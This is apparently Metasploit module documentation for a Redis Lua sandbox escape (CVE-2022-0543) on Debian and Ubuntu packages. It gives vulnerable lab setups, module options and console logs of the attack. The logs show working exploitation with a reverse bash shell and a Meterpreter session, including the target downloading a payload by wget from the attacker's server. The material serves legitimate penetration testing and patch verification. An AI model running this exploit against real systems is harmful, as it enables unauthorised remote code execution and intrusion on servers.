## Vulnerable Application

### Description

This module exploits CVE-2022-0543, a Lua-based Redis sandbox escape. The
vulnerability was introduced by Debian and Ubuntu Redis packages that
insufficiently sanitized the Lua environment. The maintainers failed to
disable the package interface, allowing attackers to load arbitrary libraries.

On a typical `redis` deployment (not docker), this module achieves execution
as the `redis` user. Debian/Ubuntu packages run Redis using systemd with the
"MemoryDenyWriteExecute" permission, which limits some of what an attacker can
do. For example, staged meterpreter will fail when attempting to use mprotect.
As such, stageless meterpreter is the preferred payload.

Redis can be configured with authentication or not. This module will work with
either configuration (provided you provide the correct authentication details).
This vulnerability could theoretically be exploited across a few architectures:
i386, arm, ppc, etc. However, the module only supports x86_64, which is likely
to be the most popular version.

### Setup

I'll explain two setup scenarios. I'll first go through Docker since it's so easy
but I don't think it's realistically the most likely deployment. I'll then
explain an Ubuntu 20.04 installation.

#### Docker

This will deploy an official Ubuntu Redis image. To get a vulnerable image do the
following:

1. `docker pull ubuntu/redis:6.0-21.04_edge`
1. `docker run -d --name vuln_redis -e TZ=UTC -p 6379:6379 -e REDIS_PASSWORD=mypassword ubuntu/redis:6.0-21.04_edge`

The vulnerable Redis will now be on port 6379. Note that this version uses a password.

To deploy a patched version, do the following:

1. `docker pull ubuntu/redis:latest`
1. `sudo docker run -d --name fixed_redis -e TZ=UTC -p 6379:6379 -e REDIS_PASSWORD=mypassword ubuntu/redis:latest`

#### Ubuntu 20.04

1. `sudo apt-get install redis-tools=5:5.0.7-2`
1. `sudo apt-get install redis-server=5:5.0.7-2`
1. `sudo nano /etc/redis/redis.conf` -> Comment out "bind" and change "protected-mode" to no.
1. `sudo service redis restart`

## Verification Steps

* Follow setup steps above.
* Do: `use exploit/linux/redis/redis_debian_sandbox_escape`
* Do: `set RHOST <ip>`
* Do: `set LHOST <ip>`
* Do: If needed - `set PASSWORD <password>`
* Do: `check`
* Verify the remote host is vulnerable.
* Do: `run`
* Verify the module receives a reverse shell

## Options

### LUA_LIB

The path to the Lua library to load. The default, `/usr/lib/x86_64-linux-gnu/liblua5.1.so.0`,
appears to be valid for both Ubuntu and Debian but I made it optional in case some edge
case crops up that I hadn't considered.

### PASSWORD

The password, if needed, to use with the Redis AUTH command.

## Scenarios

### Successful exploitation of Redis on Ubuntu 20.04 for reverse bash shell

```
msf6 > use exploit/linux/redis/redis_debian_sandbox_escape
[*] Using configured payload cmd/unix/reverse_bash
msf6 exploit(linux/redis/redis_debian_sandbox_escape) > set RHOST 10.0.0.22
RHOST => 10.0.0.22
msf6 exploit(linux/redis/redis_debian_sandbox_escape) > set LHOST 10.0.0.2
LHOST => 10.0.0.2
msf6 exploit(linux/redis/redis_debian_sandbox_escape) > check
[+] 10.0.0.22:6379 - The target is vulnerable. Successfully executed the 'id' command.
msf6 exploit(linux/redis/redis_debian_sandbox_escape) > run

[*] Started reverse TCP handler on 10.0.0.2:4444 
[*] 10.0.0.22:6379        - Running automatic check ("set AutoCheck false" to disable)
[+] 10.0.0.22:6379        - The target is vulnerable. Successfully executed the 'id' command.
[*] 10.0.0.22:6379        - Executing Unix Command for cmd/unix/reverse_bash
[+] 10.0.0.22:6379        - Exploit complete!
[*] Command shell session 1 opened (10.0.0.2:4444 -> 10.0.0.22:60844 ) at 2022-04-26 03:17:39 -0700

id
uid=127(redis) gid=134(redis) groups=134(redis)
uname -a
Linux ubuntu 5.13.0-40-generic #45~20.04.1-Ubuntu SMP Mon Apr 4 09:38:31 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
```

### Successful exploitation of Redis on Ubuntu 20.04 for reverse meterpreter

```
msf6 > use exploit/linux/redis/redis_debian_sandbox_escape
[*] Using configured payload cmd/unix/reverse_bash
msf6 exploit(linux/redis/redis_debian_sandbox_escape) > set RHOST 10.0.0.22
RHOST => 10.0.0.22
msf6 exploit(linux/redis/redis_debian_sandbox_escape) > set LHOST 10.0.0.2
LHOST => 10.0.0.2
msf6 exploit(linux/redis/redis_debian_sandbox_escape) > set target 1
target => 1
msf6 exploit(linux/redis/redis_debian_sandbox_escape) > run

[*] Started reverse TCP handler on 10.0.0.2:4444 
[*] 10.0.0.22:6379        - Running automatic check ("set AutoCheck false" to disable)
[+] 10.0.0.22:6379        - The target is vulnerable. Successfully executed the 'id' command.
[*] 10.0.0.22:6379        - Executing Linux Dropper for linux/x86/meterpreter_reverse_tcp
[*] 10.0.0.22:6379        - Using URL: http://10.0.0.2:8080/mBTPVKr7pZVP
[*] 10.0.0.22:6379        - Client 10.0.0.22 (Wget/1.20.3 (linux-gnu)) requested /mBTPVKr7pZVP
[*] 10.0.0.22:6379        - Sending payload to 10.0.0.22 (Wget/1.20.3 (linux-gnu))
[+] 10.0.0.22:6379        - Exploit complete!
[*] 10.0.0.22:6379        - Command Stager progress - 100.00% done (113/113 bytes)
[*] Meterpreter session 1 opened (10.0.0.2:4444 -> 10.0.0.22:60848 ) at 2022-04-26 03:21:22 -0700
[*] 10.0.0.22:6379        - Server stopped.

meterpreter > shell
Process 13120 created.
Channel 1 created.
id
uid=127(redis) gid=134(redis) groups=134(redis)
uname -a
Linux ubuntu 5.13.0-40-generic #45~20.04.1-Ubuntu SMP Mon Apr 4 09:38:31 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
```

### Successful exploitation of Redis in Ubuntu Docker for reverse bash shell

```
msf6 > use exploit/linux/redis/redis_debian_sandbox_escape
[*] Using configured payload cmd/unix/reverse_bash
msf6 exploit(linux/redis/redis_debian_sandbox_escape) > set RHOST 127.0.0.1
RHOST => 127.0.0.1
msf6 exploit(linux/redis/redis_debian_sandbox_escape) > set LHOST 10.0.0.2
LHOST => 10.0.0.2
msf6 exploit(linux/redis/redis_debian_sandbox_escape) > set PASSWORD mypassword
PASSWORD => mypassword
msf6 exploit(linux/redis/redis_debian_sandbox_escape) > check
[+] 127.0.0.1:6379 - The target is vulnerable. Successfully executed the 'id' command.
msf6 exploit(linux/redis/redis_debian_sandbox_escape) > run

[*] Started reverse TCP handler on 10.0.0.2:4444 
[*] 127.0.0.1:6379        - Running automatic check ("set AutoCheck false" to disable)
[+] 127.0.0.1:6379        - The target is vulnerable. Successfully executed the 'id' command.
[*] 127.0.0.1:6379        - Executing Unix Command for cmd/unix/reverse_bash
[+] 127.0.0.1:6379        - Exploit complete!
[*] Command shell session 1 opened (10.0.0.2:4444 -> 172.17.0.2:33148 ) at 2022-04-26 03:23:32 -0700

id
uid=0(root) gid=0(root) groups=0(root)
uname -a
Linux 9c7526769ad1 5.13.0-40-generic #45-Ubuntu SMP Tue Mar 29 14:48:14 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
```

### Failed exploitation due to wrong password

```
msf6 > use exploit/linux/redis/redis_debian_sandbox_escape
[*] Using configured payload cmd/unix/reverse_bash
msf6 exploit(linux/redis/redis_debian_sandbox_escape) > set RHOST 127.0.0.1
RHOST => 127.0.0.1
msf6 exploit(linux/redis/redis_debian_sandbox_escape) > set LHOST 10.0.0.2
LHOST => 10.0.0.2
msf6 exploit(linux/redis/redis_debian_sandbox_escape) > set PASSWORD lolwat
PASSWORD => lolwat
msf6 exploit(linux/redis/redis_debian_sandbox_escape) > check
[*] 127.0.0.1:6379 - Cannot reliably check exploitability. Failed authentication.
msf6 exploit(linux/redis/redis_debian_sandbox_escape) > 
```

### Failed exploitation of patched Redis on Debian 11

```
msf6 > use exploit/linux/redis/redis_debian_sandbox_escape
[*] Using configured payload cmd/unix/reverse_bash
msf6 exploit(linux/redis/redis_debian_sandbox_escape) > set RHOST 10.0.0.24
RHOST => 10.0.0.24
msf6 exploit(linux/redis/redis_debian_sandbox_escape) > set LHOST 10.0.0.2
LHOST => 10.0.0.2
msf6 exploit(linux/redis/redis_debian_sandbox_escape) > check
[*] 10.0.0.24:6379 - The target is not exploitable. Could not execute 'id' on the remote target.
msf6 exploit(linux/redis/redis_debian_sandbox_escape) > 
```

### Failed exploitation of not-vulnerable Ubuntu 18.04 i386.

```
msf6 > use exploit/linux/redis/redis_debian_sandbox_escape
[*] Using configured payload cmd/unix/reverse_bash
msf6 exploit(linux/redis/redis_debian_sandbox_escape) > set RHOST 10.0.0.25
RHOST => 10.0.0.25
msf6 exploit(linux/redis/redis_debian_sandbox_escape) > set LHOST 10.0.0.2
LHOST => 10.0.0.2
msf6 exploit(linux/redis/redis_debian_sandbox_escape) > check
[*] 10.0.0.25:6379 - The target is not exploitable. The reported version is unaffected: 4.0.9
msf6 exploit(linux/redis/redis_debian_sandbox_escape) >
```
